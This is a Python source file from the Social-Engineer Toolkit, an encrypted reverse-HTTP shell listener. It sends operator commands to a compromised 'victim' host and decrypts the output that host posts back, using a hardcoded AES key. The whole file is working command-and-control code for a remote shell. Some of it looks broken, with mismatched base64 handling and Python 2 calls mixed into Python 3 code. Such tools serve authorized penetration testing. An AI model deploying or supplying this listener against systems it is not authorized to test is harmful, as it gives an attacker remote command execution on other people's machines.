#!/usr/bin/python
############################################
#
#
# AES Encrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     https://www.trustedsec.com
#
#
############################################
from http.server import BaseHTTPRequestHandler
from http.server import HTTPServer
import urllib
import re
import os
import base64
from Crypto.Cipher import AES
import sys
import time
from src.core.setcore import *

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# 32 character secret key - change this if you want to be unique
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"

# create a cipher object using the random secret
cipher = AES.new(secret)

# url decode for postbacks


def htc(m):
    return chr(int(m.group(1), 16))

# url decode


def urldecode(url):
    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
    return rex.sub(htc, url)


class GetHandler(BaseHTTPRequestHandler):

    # handle get request
    def do_GET(self):

        # this will be our shell command
        message = input("shell> ")
        # if we specify quit, then sys arg out of the shell
        if message == "quit" or message == "exit":
            print ("\nExiting the SET RevShell Listener... ")
            time.sleep(2)
            sys.exit()
        # send a 200 OK response
        self.send_response(200)
        # end headers
        self.end_headers()
        # encrypt the message
        message = EncodeAES(cipher, message)
        # base64 it
        message = base64.b64encode(message)
        # write our command shell param to victim
        self.wfile.write(message)
        # return out
        return

    # handle post request
    def do_POST(self):

        # send a 200 OK response
        self.send_response(200)
        # # end headers
        self.end_headers()
        # grab the length of the POST data
        length = int(self.headers.getheader('content-length'))
        # read in the length of the POST data
        qs = self.rfile.read(length)
        # url decode
        url = urldecode(qs)
        # remove the parameter cmd
        url = url.replace("cmd=", "")
        # base64 decode
        message = base64.b64decode(url)
        # decrypt the string
        message = DecodeAES(cipher, message)
        # display the command back decrypted
        print(message)

# if __name__ == '__main__':
try:
    # bind to all interfaces
    if check_options("PORT=") != 0:
        port = check_options("PORT=")

    else:
        port = 443

    server = HTTPServer(('', int(port)), GetHandler)
    print("""############################################
#
# The Social-Engineer Toolkit (SET) HTTP RevShell
#
#        Dave Kennedy (ReL1K)
#     https://www.trustedsec.com
#
############################################""")
    print('Starting encrypted web shell server, use <Ctrl-C> to stop')
    # simple try block
    try:
        # serve and listen forever
        server.serve_forever()
    # handle keyboard interrupts
    except KeyboardInterrupt:
        print("[!] Exiting the encrypted webserver shell.. hack the gibson.")
except Exception as e:
    print("Something went wrong, printing error: " + e)
